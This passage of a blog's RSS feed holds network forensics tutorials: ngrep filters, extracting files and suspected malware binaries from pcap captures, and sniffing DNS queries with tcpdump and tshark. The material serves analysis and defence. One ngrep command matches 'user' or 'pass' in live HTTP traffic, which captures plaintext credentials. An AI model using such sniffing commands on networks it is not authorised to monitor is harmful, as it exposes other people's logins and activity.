&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# ngrep -d eth0 -q -i &amp;quot;^GET |^POST &amp;quot; tcp and port 80
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Monitor the occurrence of the words &lt;code&gt;user&lt;/code&gt; or &lt;code&gt;pass&lt;/code&gt;, case insensitive:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# ngrep -d eth0 -wi &#39;user | pass&#39; port 80
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Read from a pcap file, search for &lt;code&gt;GET&lt;/code&gt; and &lt;code&gt;POST&lt;/code&gt; requests:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# ngrep -qt -W byline -I capture.pcap | grep &#39;GET\|POST&#39;
&lt;/code&gt;&lt;/pre&gt;

&lt;hr /&gt;

&lt;h3 id=&#34;ip-address&#34;&gt;IP address:&lt;/h3&gt;

&lt;p&gt;Matches all headers containing pattern string &amp;lsquo;HTTP&amp;rsquo; sent to/from ip address starting with 172.16&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# ngrep -qt -I capture.pcap &#39;HTTP&#39; &#39;host 172.16&#39; | grep &#39;GET\|POST&#39;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/ngrep-quick-peek-at-http-traffic-01.png&#34; alt=&#34;ngrep-quick-peek-at-http-traffic-01&#34; /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&#34;dns&#34;&gt;DNS:&lt;/h3&gt;

&lt;p&gt;Capture incoming/outgoing to/from eth0 matches DNS queries/responses&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# ngrep -qt -W byline -d eth0 udp and port 53
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>Extract files from captured network traffic pcap (2)</title>
      <link>https://tzyluen.github.io/post/extract-files-from-captured-network-traffic-pcap-2/</link>
      <pubDate>Sat, 09 Apr 2016 00:00:00 +0800</pubDate>
      
      <guid>https://tzyluen.github.io/post/extract-files-from-captured-network-traffic-pcap-2/</guid>
      <description>

&lt;h1 id=&#34;tcpxtract&#34;&gt;Tcpxtract&lt;/h1&gt;

&lt;ul&gt;
&lt;li&gt;Supports 26 file formats, extensible (&lt;code&gt;/etc/tcpxtract.conf&lt;/code&gt;), however it requires the clear start and end markers.&lt;/li&gt;
&lt;li&gt;Supports only TCP packets, no UDP.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Live capture from an interface and extract:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ mkdir -p /tmp/enp0s3-tcpxtract-output
$ sudo tcpxtract -d enp0s3 -o /tmp/enp0s3-tcpxtract-output
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Extract from pcap file:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/extracting-files-tcpxtract-01.png&#34; alt=&#34;extracting-files-tcpxtract-01&#34; /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&#34;tcpextract&#34;&gt;Tcpextract&lt;/h1&gt;

&lt;ul&gt;
&lt;li&gt;Similar to both &lt;code&gt;tcpflow&lt;/code&gt; and &lt;code&gt;tcpxtract&lt;/code&gt;, it extracts all files it recognized from a pcap file or interface.&lt;/li&gt;
&lt;li&gt;Extracts files with their original names, instead of the index names i.e., 0000001.htm.&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ sudo apt-get install python-nids
$ git clone https://github.com/faust/tcpextract.git
$ cd tcpextract/
$ sudo python setup.py install
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;However, it is not well supported, or unstable.  It failed to extract http traffic during the experiment:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/extracting-files-tcpextract-01.png&#34; alt=&#34;extracting-files-tcpextract-01&#34; /&gt;&lt;/p&gt;

&lt;p&gt;So, converts &lt;code&gt;pcapng&lt;/code&gt; to &lt;code&gt;pcap&lt;/code&gt; file format:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ editcap http_espn.pcapng http_espn.pcap
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;After a few attempt, it still failed silently with zero file extracted.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Extract files from captured network traffic pcap (1)</title>
      <link>https://tzyluen.github.io/post/extract-files-from-captured-network-traffic-pcap-1/</link>
      <pubDate>Sat, 02 Apr 2016 00:00:00 +0800</pubDate>
      
      <guid>https://tzyluen.github.io/post/extract-files-from-captured-network-traffic-pcap-1/</guid>
      <description>

&lt;h1 id=&#34;introduction&#34;&gt;Introduction&lt;/h1&gt;

&lt;p&gt;The process is mostly the same in network packets data-carving:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Gain access and collect the raw bytes&lt;/li&gt;
&lt;li&gt;Strip the protocol information&lt;/li&gt;
&lt;li&gt;Extract and write the data to file&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The difference of these tools are the capability i.e., supported protocols and file formats.&lt;/p&gt;

&lt;h1 id=&#34;wireshark&#34;&gt;Wireshark&lt;/h1&gt;

&lt;p&gt;&lt;strong&gt;HTTP objects/files:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Navigate to &lt;code&gt;File&lt;/code&gt; &amp;rarr; &lt;code&gt;Export Objects&lt;/code&gt; and select the type, currently it supports four protocols:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/extracting-files-wireshark-export-http-object-list-01.png&#34; alt=&#34;extracting-files-wireshark-export-http-object-list-01&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Then select the target filename followed by &lt;code&gt;Save&lt;/code&gt; or simply &lt;code&gt;Save All&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/extracting-files-wireshark-export-http-object-list-02.png&#34; alt=&#34;extracting-files-wireshark-export-http-object-list-02&#34; /&gt;&lt;/p&gt;

&lt;p&gt;List of exported objects and the respective file types:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/extracting-files-wireshark-export-http-object-list-03.png&#34; alt=&#34;extracting-files-wireshark-export-http-object-list-03&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Alternatively, the &lt;code&gt;Follow&lt;/code&gt; &amp;rarr; &lt;code&gt;TCP Stream&lt;/code&gt; can also be used to extract raw files from the stream:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/extracting-files-wireshark-follow-tcp-stream-01.png&#34; alt=&#34;extracting-files-wireshark-follow-tcp-stream-01&#34; /&gt;
&lt;img src=&#34;https://tzyluen.github.io/img/extracting-files-wireshark-follow-tcp-stream-02.png&#34; alt=&#34;extracting-files-wireshark-follow-tcp-stream-02&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Binary files:&lt;/strong&gt;
In real world scenario, malware often spread through http protocol, thus we could search the common strings used by malware such as &lt;code&gt;GetProcAddress&lt;/code&gt;, &lt;code&gt;ExitProcess&lt;/code&gt; and etc. (statistically reported in paper by Gong et al. [1]).&lt;/p&gt;

&lt;p&gt;Use the display filter &lt;code&gt;http contains &amp;quot;GetProcAddress&amp;quot;&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/extracting-files-wireshark-binary-files-01.png&#34; alt=&#34;extracting-files-wireshark-binary-files-01&#34; /&gt;&lt;/p&gt;

&lt;p&gt;There are multiple ways to export the packets (binary file):&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;Export Objects &amp;rarr; HTTP, and select the file from the list:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/extracting-files-wireshark-binary-files-03.png&#34; alt=&#34;extracting-files-wireshark-binary-files-03&#34; /&gt;&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Export Packet Bytes:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/extracting-files-wireshark-binary-files-05.png&#34; alt=&#34;extracting-files-wireshark-binary-files-04&#34; /&gt;&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Once the binary is obtained, we could use hex editor to view the binary file, and locate the matching strings:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ xxd mal.bin |less
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/extracting-files-wireshark-binary-files-02.png&#34; alt=&#34;extracting-files-wireshark-binary-files-02&#34; /&gt;&lt;/p&gt;

&lt;p&gt;MD5 checksum:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/extracting-files-wireshark-binary-files-04.png&#34; alt=&#34;extracting-files-wireshark-binary-files-04&#34; /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&#34;tcpflow-foremost&#34;&gt;Tcpflow &amp;amp; Foremost&lt;/h1&gt;

&lt;p&gt;Assuming the pcap file &lt;code&gt;192.168.1.0.pcap&lt;/code&gt; contains the packets captured from the &lt;code&gt;192.168.1.0/24&lt;/code&gt; network, we could use &lt;code&gt;tcpflow&lt;/code&gt; to export the data streams into individual files by ip-addresses:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/extracting-files-wireshark-foremost-01.png&#34; alt=&#34;extracting-files-wireshark-foremost-01&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;Tcpflow&lt;/code&gt; only handles the direction of the data streams, and if the target binary files were not split into individual files by &lt;code&gt;tcpflow&lt;/code&gt;, we could use foremost to complement the processes:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; add the following line to &lt;code&gt;/etc/foremost.conf&lt;/code&gt; to add Mach-O binary file format&amp;rsquo;s signature.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;bin    n    4096000    \xCF\xFA\xED\xFE\x07\x00
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;where,&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;[filetype]  [case-sensitivity]  [upper-limit-for-size]  [signature header]  [footer]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Concatenate the data files generated by tcpflow into a single file:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/extracting-files-wireshark-foremost-02.png&#34; alt=&#34;extracting-files-wireshark-foremost-02&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Parse the file with &lt;code&gt;Foremost&lt;/code&gt;, followed by validation with md5sum which yielded identical result to previous value of &lt;code&gt;mal.bin&lt;/code&gt; file shown above in &lt;code&gt;192.168.1.7&lt;/code&gt;:
&lt;img src=&#34;https://tzyluen.github.io/img/extracting-files-wireshark-foremost-03.png&#34; alt=&#34;extracting-files-wireshark-foremost-03&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; &lt;code&gt;tcpflow&lt;/code&gt; only support TCP packets, it doesn not handle UDP packets. To separate the packets not processed by &lt;code&gt;tcpflow&lt;/code&gt;, use the &lt;code&gt;-w&lt;/code&gt; option:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt; -w filename.pcap
    Write packets that were not processed to filename.pcap. Typically this will be UDP packets.
&lt;/code&gt;&lt;/pre&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;References:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;[1] Gong, M., Girkar, U., &amp;amp; Xie, B. Classifying Windows Malware with Static Analysis. &lt;br&gt;
[2] &lt;a href=&#34;https://www.sans.org/reading-room/whitepapers/forensics/extracting-files-network-packet-captures-36562&#34;&gt;https://www.sans.org/reading-room/whitepapers/forensics/extracting-files-network-packet-captures-36562&lt;/a&gt; &lt;br&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Sniff DNS queries</title>
      <link>https://tzyluen.github.io/post/sniff-dns-queries/</link>
      <pubDate>Sat, 20 Feb 2016 00:00:00 +0800</pubDate>
      
      <guid>https://tzyluen.github.io/post/sniff-dns-queries/</guid>
      <description>

&lt;h1 id=&#34;dnstop&#34;&gt;Dnstop&lt;/h1&gt;

&lt;p&gt;is a console libpcap application that displays various tables of DNS traffic on a network including:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Source IP addresses&lt;/li&gt;
&lt;li&gt;Destination IP addresses&lt;/li&gt;
&lt;li&gt;Query types&lt;/li&gt;
&lt;li&gt;Top level domains&lt;/li&gt;
&lt;li&gt;Second level domains&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# dnstop enp0s3 -l 3
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/dnstop-monitoring-large-count-01.png&#34; alt=&#34;dnstop-monitoring-01&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Use &lt;code&gt;ctrl-r&lt;/code&gt; to reset the counter/refresh the history to get the latest queries.&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&#34;tcpdump&#34;&gt;Tcpdump&lt;/h1&gt;

&lt;p&gt;Capture packets on port 53 (DNS):&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;-i: interface
-v: verbose
-s: snaplen, snap n bytes length from each packet (default 262144).
    setting lowest n to prevent packet lost.
-n: do not convert addresses/ports to names.
-w: write the raw packets to file.

# tcpdump -i eth0 -v -s0 port 53 -w /tmp/dns-queries.pcap
tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
Got 223
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Read from captured raw pcap file:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;-q: quick/quiet/shorter output. Less protocol information.
-A: print the payload in ASCII.
-X: print the payload in hex and ASCII.
-tttt: print a human readable timestamp, preceded by the date, on each dump line.
-r: read packets from file.

# tcpdump -ns 0 -A -tttt -r /tmp/dns-queries.pcap

2016-04-03 19:15:28.673885 IP 192.168.1.7.50906 &amp;gt; 192.168.1.1.53: 25364+ A? www.reddit.com. (32)
E..&amp;lt;......l............5.(.|c............www.reddit.com.....

2016-04-03 19:15:28.737323 IP 192.168.1.1.53 &amp;gt; 192.168.1.7.50906: 25364 5/0/0 CNAME reddit.map.fastly.net., A 151.101.1.140, A 151.101.65.140, A 151.101.129.140, A 151.101.193.140 (131)
E.....@.@............5.....%c............www.reddit.com.............. ...reddit.map.fastly.net..,...........e...,...........eA..,...........e...,...........e..
&lt;/code&gt;&lt;/pre&gt;

&lt;hr /&gt;

&lt;h1 id=&#34;wireshark-tshark&#34;&gt;Wireshark / Tshark&lt;/h1&gt;

&lt;p&gt;The console version of Wireshark comes handy to quickly monitor the traffic on port 53. It works the same as the capture and display filters from Wireshark.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;-f: capture filter
-Y: display filter
$ tshark -i enp0s3 -f &amp;quot;udp port 53&amp;quot; -Y &amp;quot;dns.qry.type == 1 and dns.flags.response == 0&amp;quot;
Capturing on &#39;enp0s3&#39;
    1 0.000000000  192.168.1.7 → 192.168.1.1  DNS 72 Standard query 0xcb2a A slashdot.org
...
   18 3.274217622  192.168.1.7 → 192.168.1.1  DNS 70 Standard query 0x1c9f A reddit.com
   21 3.367215915  192.168.1.7 → 192.168.1.1  DNS 74 Standard query 0x931d A www.reddit.com
...
   51 8.045870811  192.168.1.7 → 192.168.1.1  DNS 71 Standard query 0xf2b0 A youtube.com
   52 8.057876881  192.168.1.7 → 192.168.1.1  DNS 83 Standard query 0x5358 A youtube-ui.l.google.com
...
   65 10.438546212  192.168.1.7 → 192.168.1.1  DNS 72 Standard query 0xfab8 A facebook.com
   67 10.479990482  192.168.1.7 → 192.168.1.1  DNS 74 Standard query 0x7b3d A www.google.com
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The &amp;lsquo;&lt;code&gt;dns.qry.type == A&lt;/code&gt;&amp;rsquo; will throws &amp;lsquo;&lt;code&gt;tshark: &amp;quot;A&amp;quot; cannot be found among the possible values for dns.qry.type.&lt;/code&gt;&amp;rsquo;. The decimal value for a type &amp;lsquo;A&amp;rsquo; DNS query type is 1.&lt;/p&gt;

&lt;p&gt;Type ID in decimal - &lt;a href=&#34;https://en.wikipedia.org/wiki/List_of_DNS_record_types&#34;&gt;https://en.wikipedia.org/wiki/List_of_DNS_record_types&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>